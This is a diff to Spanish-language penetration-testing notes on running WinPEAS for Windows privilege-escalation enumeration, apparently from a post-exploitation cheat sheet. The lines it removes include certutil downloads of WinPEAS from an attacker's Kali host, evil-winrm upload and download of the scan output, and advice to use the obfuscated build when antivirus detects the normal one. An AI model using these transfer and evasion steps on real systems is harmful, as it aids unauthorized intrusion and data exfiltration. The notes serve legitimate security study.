@@ -19,32 +19,13 @@ Tags: #WinPEAS #Windows #PrivEsc #Enumeracion #PostExplotacion #Automatizacion
 * [WinPEAS GitHub](https://github.com/peass-ng/PEASS-ng/blob/master/winPEAS/winPEASexe/README.md)
 * [Releases](https://github.com/peass-ng/PEASS-ng/releases) → descargar binarios precompilados
 
----
 
-## 1. TRANSFERIR Y EJECUTAR
+## 1. EJECUTAR
 
 ```powershell
-# Transferir desde Kali
-# En Kali → python3 -m http.server 80
-❯ certutil -urlcache -f http://<IP_KALI>/winPEASany.exe C:\Temp\winPEAS.exe
-❯ certutil -urlcache -f http://<IP_KALI>/winPEASany_ofs.exe C:\Temp\winPEAS_ofs.exe
-
-# Desde evil-winrm
-❯ upload /home/kali/winPEASany.exe
-
-# Ejecutar desde C:\tmp o C:\Windows\Temp
-❯ .\winPEASany.exe
-# Versión normal → más detallada
-
-❯ .\winPEASany_ofs.exe
-# Versión ofuscada → cuando AV detecta la normal
-
 # Guardar output a archivo → SIEMPRE hacerlo
 ❯ .\winPEASany.exe > C:\Temp\winpeas_output.txt
 ❯ .\winPEASany.exe | Out-File -Encoding ASCII C:\Temp\winpeas_output.txt
-
-# Transferir el output a Kali para revisarlo cómodamente
-❯ download C:\Temp\winpeas_output.txt    # Desde evil-winrm
 ```
 
 ---
